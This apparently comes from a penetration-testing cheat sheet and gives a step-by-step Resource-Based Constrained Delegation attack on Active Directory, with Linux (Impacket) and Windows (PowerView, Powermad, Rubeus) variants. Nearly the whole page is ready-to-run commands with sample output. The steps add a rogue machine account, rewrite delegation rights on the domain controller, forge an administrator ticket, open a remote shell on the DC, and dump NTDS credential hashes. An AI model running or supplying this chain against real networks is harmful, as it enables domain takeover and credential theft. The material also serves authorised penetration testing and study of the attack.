---
title: "RBCD Attack"
date: 2025-7-25
tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping"]
---

### RBCD Attack

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Check Machine Account Quota

```console
nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M maq
```

```console {class="sample-code"}
$ nxc ldap example.com -u 'test.user' -p 'Test1234' -M maq
SMB         10.10.11.10      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False)
LDAP        10.10.11.10      389    DC               [+] example.com\test.user:Test1234 
MAQ         10.10.11.10      389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.11.10      389    DC               MachineAccountQuota: 10
```

#### 1. Add a Fake Computer

```console
impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'Test1234' -dc-ip 10.10.11.10 'example.com/test.user:Test1234'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Successfully added machine account EvilComputer$ with password Test1234.
```

#### 2. RBCD Attack

```console
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
```

```console {class="sample-code"}
$ impacket-rbcd -delegate-to 'DC$' -delegate-from 'EvilComputer$' -dc-ip 10.10.11.10 -action 'write' 'example.com/test.user:Test1234' 
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
```

#### 3. Impersonate

```console
sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC_IP> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.example.com && impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip 10.10.11.10 'example.com/EvilComputer:Test1234'
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

#### 4. Import Ticket

```console
export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
```

#### 5. Post-Attack

```console
# Remote
sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.example.com && wmiexec.py example.com/administrator@dc.example.com -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

```console {class="sample-code"}
$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Modules

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> . .\PowerView.ps1
```

```console
. .\Powermad.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> . .\Powermad.ps1
```

<small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>

#### 2. Check Machine Account Quota

```console
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-DomainObject -Identity 'DC=EXAMPLE,DC=COM' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

#### 3. Create New Computer Account

```console
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> New-MachineAccount -MachineAccount EvilComputer -Password
$(ConvertTo-SecureString 'Test1234' -AsPlainText -Force)
[+] Machine account EvilComputer added
```

#### 4. RBCD Attack

```console
$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```console
$fakesid
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $fakesid
S-1-5-21-3542429192-2036945976-3483670807-11601
```

```console
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console
$SD.GetBinaryForm($SDBytes, 0)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $SD.GetBinaryForm($SDBytes, 0)
```

```console
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### 5. Check if SecurityIdentifier is Now fakesid 

```console
$RawBytes = Get-DomainComputer <TARGET_COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console
$Descriptor.DiscretionaryAcl
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-3542429192-2036945976-3483670807-11601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

#### 6. Impersonate

```console
.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:EvilComputer /domain:<DOMAIN>
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> .\rubeus.exe hash /password:'Test1234' /user:EvilComputer /domain:example.com

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : Test1234
[*] Input username             : EvilComputer
[*] Input domain               : example.com
[*] Salt                       : EXAMPLE.COMEvilComputer
[*]       rc4_hmac             : B9E0CFCEAF6D077970306A2FD88A7C0A
[*]       aes128_cts_hmac_sha1 : FE834E7490537D833B4FBB0C215BEDB3
[*]       aes256_cts_hmac_sha1 : D105000C879775D1727D9E56EF0CA48FD2996B9370165832BB1C5A265922B359
[*]       des_cbc_md5          : DAE66B133454FDB5
```

```console
.\rubeus.exe s4u /user:'EvilComputer$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\test.user\Documents> .\rubeus.exe s4u /user:'EvilComputer$' /rc4:B9E0CFCEAF6D077970306A2FD88A7C0A /impersonateuser:administrator /msdsspn:cifs/dc.example.com /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: B9E0CFCEAF6D077970306A2FD88A7C0A
[*] Building AS-REQ (w/ preauth) for: 'example.com\EvilComputer$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFuDCCBb ---[SNIP]--- VyLmh0Yg==

[*] Action: S4U

[*] Building S4U2self request for: 'EvilComputer$@EXAMPLE.COM'
[*] Using domain controller: DC.example.com (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'EvilComputer$@EXAMPLE.COM'
[*] base64(ticket.kirbi):

      doIGCjCCBg ---[SNIP]--- 1wdXRlciQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.example.com'
[*] Building S4U2proxy request for service: 'cifs/dc.example.com'
[*] Using domain controller: DC.example.com (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.example.com':

      doIGujCCBr ---[SNIP]--- VyLmh0Yg==
[+] Ticket successfully imported!
```

#### 7. Convert to ccache Format

```console
python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
```

```console {class="sample-code"}
$ python3 rubeustoccache.py 'doIGujCCBr ---[SNIP]--- VyLmh0Yg==' secrets.kirbi secrets.ccache
╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
              By Solomon Sklash
          github.com/SolomonSklash
   Inspired by Zer1t0's ticket_converter.py

[*] Writing decoded .kirbi file to secrets.kirbi
[*] Writing converted .ccache file to secrets.ccache
[*] All done! Don't forget to set your environment variable: export KRB5CCNAME=secrets.ccache
```

```console
export KRB5CCNAME=secrets.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=secrets.ccache
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

#### 8. Post-Attack

```console
# Remote
sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.example.com && impacket-psexec example.com/administrator@dc.example.com -k -no-pass

Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Requesting shares on dc.example.com.....
[*] Found writable share ADMIN$
[*] Uploading file sxEWFPos.exe
[*] Opening SVCManager on dc.example.com.....
[*] Creating service OtwL on dc.example.com.....
[*] Starting service OtwL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> 
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

```console {class="sample-code"}
$ impacket-secretsdump administrator@dc.example.com -k -no-pass -just-dc-user Administrator
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca509:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
